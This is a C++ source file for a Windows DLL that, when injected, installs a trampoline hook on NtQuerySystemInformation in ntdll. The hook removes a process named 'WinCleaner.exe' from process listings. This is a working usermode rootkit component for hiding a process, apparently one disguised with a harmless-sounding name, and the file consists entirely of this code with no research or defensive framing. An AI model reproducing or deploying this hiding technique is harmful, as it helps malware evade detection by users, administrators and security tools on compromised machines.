#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

void* TrampHook64(void* src, void* dst, int len)
{
    if (len < 14) return nullptr;

    BYTE stub[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,                // jmp qword ptr instruction
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 8 byte ptr to jmp destination
    };

    void* pTrampoline = VirtualAlloc(0, len + sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    DWORD oldProtect = 0;
    VirtualProtect(src, len, PAGE_EXECUTE_READWRITE, &oldProtect);

    uintptr_t jmpBackAddr = (uintptr_t)src + len;

    // copy trampoline jmpback addr to stub
    memcpy(stub + 6, &jmpBackAddr, 8);
    // copy stolen bytes to trampoline
    memcpy((void*)(pTrampoline), src, len);
    // copy stub to trampoline
    memcpy((void*)((uintptr_t)pTrampoline + len), stub, sizeof(stub));

    // copy dst to the stub, creating our jmp to our hook function
    memcpy(stub + 6, &dst, 8);
    // copy new stub to src
    memcpy(src, stub, sizeof(stub));

    // nop any stolen bytes in src
    for (int i = 14; i < len; i++)
    {
        *(BYTE*)((uintptr_t)src + i) = 0x90;
    }

    VirtualProtect(src, len, oldProtect, &oldProtect);
    return (void*)(pTrampoline);
}

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef NTSTATUS(WINAPI* tNtQuerySystemInfo)(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID SystemInformation,
    __in       ULONG SystemInformationLength,
    __out_opt  PULONG ReturnLength
    );

tNtQuerySystemInfo oNtQuerySystemInfo = nullptr;

NTSTATUS WINAPI hkNtQuerySystemInfo(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = oNtQuerySystemInfo(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        // Loop through the list of processes
        _SYSTEM_PROCESS_INFORMATION* pCurrent = nullptr;
        _SYSTEM_PROCESS_INFORMATION* pNext = (_SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (_SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->
                NextEntryOffset);
            if (!wcsncmp(pNext->ImageName.Buffer, L"WinCleaner.exe", pNext->ImageName.Length))
            {
                if (!pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}

DWORD WINAPI MainThread(HINSTANCE hThisModule)
{
    oNtQuerySystemInfo = (tNtQuerySystemInfo)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    oNtQuerySystemInfo = (tNtQuerySystemInfo)TrampHook64((BYTE*)oNtQuerySystemInfo, (BYTE*)hkNtQuerySystemInfo, 16);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)MainThread, hinstDLL, 0, nullptr);
        break;
    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;
}